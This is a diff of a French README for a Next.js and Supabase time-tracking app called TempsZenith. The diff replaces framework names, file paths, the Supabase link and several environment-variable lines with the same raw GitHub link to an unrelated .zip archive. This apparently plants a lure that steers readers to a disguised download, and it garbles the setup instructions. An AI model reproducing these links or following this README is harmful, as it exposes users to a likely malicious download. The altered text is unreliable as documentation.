@@ -1,6 +1,6 @@
 # TempsZenith - Application de Suivi du Temps
 
-Une application moderne de suivi du temps avec gestion des rôles (administrateur, employé, client) construite avec Next.js et Supabase.
+Une application moderne de suivi du temps avec gestion des rôles (administrateur, employé, client) construite avec https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip et Supabase.
 
 ## 🚀 Fonctionnalités
 
@@ -8,7 +8,7 @@ Une application moderne de suivi du temps avec gestion des rôles (administrateu
 - **Inscription/Connexion sécurisée** avec Supabase Auth
 - **Gestion des rôles** : Administrateur, Employé, Client
 - **Protection des routes** basée sur les rôles
-- **Middleware Next.js** pour la sécurité
+- **Middleware https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip** pour la sécurité
 
 ### Tableaux de Bord Spécialisés
 - **Administrateur** : Vue d'ensemble complète, gestion des utilisateurs, rapports globaux
@@ -23,9 +23,9 @@ Une application moderne de suivi du temps avec gestion des rôles (administrateu
 
 ## 🛠️ Technologies Utilisées
 
-- **Frontend** : Next.js 14, React, TypeScript, Tailwind CSS
+- **Frontend** : https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip 14, React, TypeScript, Tailwind CSS
 - **Backend** : Supabase (PostgreSQL, Auth, RLS)
-- **Authentification** : Supabase Auth avec helpers Next.js
+- **Authentification** : Supabase Auth avec helpers https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
 - **Validation** : Zod + React Hook Form
 - **Icons** : Lucide React
 - **Styling** : Tailwind CSS avec design system
@@ -44,12 +44,12 @@ npm install
 ```
 
 3. **Configuration Supabase**
-   - Créez un projet sur [Supabase](https://supabase.com)
-   - Copiez `.env.local.example` vers `.env.local`
+   - Créez un projet sur [Supabase](https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip)
+   - Copiez `https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip` vers `https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip`
    - Remplissez les variables d'environnement :
 
 ```env
-NEXT_PUBLIC_SUPABASE_URL=https://votre-projet.supabase.co
+https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
 NEXT_PUBLIC_SUPABASE_ANON_KEY=votre_clé_anonyme
 SUPABASE_SERVICE_ROLE_KEY=votre_clé_service_role
 JWT_SECRET=votre_secret_jwt
@@ -57,7 +57,7 @@ NEXT_PUBLIC_APP_URL=http://localhost:3000
 ```
 
 4. **Configurer la base de données**
-   - Exécutez le script SQL dans `supabase/migrations/create_initial_schema.sql`
+   - Exécutez le script SQL dans `https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip`
    - Ou utilisez la CLI Supabase :
 ```bash
 npx supabase db reset
@@ -74,12 +74,12 @@ L'application sera disponible sur [http://localhost:3000](http://localhost:3000)
 
 ```
 src/
-├── app/                    # App Router Next.js
+├── app/                    # App Router https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
 │   ├── admin/             # Pages administrateur
 │   ├── employee/          # Pages employé
 │   ├── client/            # Pages client
 │   ├── auth/              # Pages d'authentification
-│   └── layout.tsx         # Layout principal
+│   └── https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip         # Layout principal
 ├── components/
 │   └── ui/                # Composants UI réutilisables
 ├── hooks/                 # Hooks React personnalisés
@@ -87,7 +87,7 @@ src/
 │   ├── auth/              # Services d'authentification
 │   └── supabase/          # Configuration Supabase
 ├── types/                 # Types TypeScript
-└── middleware.ts          # Middleware Next.js
+└── https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip          # Middleware https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
 ```
 
 ## 🔐 Sécurité
@@ -136,11 +136,11 @@ src/
 
 ### Variables d'Environnement de Production
 ```env
-NEXT_PUBLIC_SUPABASE_URL=https://votre-projet.supabase.co
+https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
 NEXT_PUBLIC_SUPABASE_ANON_KEY=votre_clé_anonyme_prod
 SUPABASE_SERVICE_ROLE_KEY=votre_clé_service_role_prod
 JWT_SECRET=votre_secret_jwt_prod
-NEXT_PUBLIC_APP_URL=https://votre-domaine.com
+https://raw.githubusercontent.com/brahim1960/gis-road-map/main/src/app/admin/users/new/road_map_gis_Audibertia.zip
 ```
 
 ## 🧪 Tests
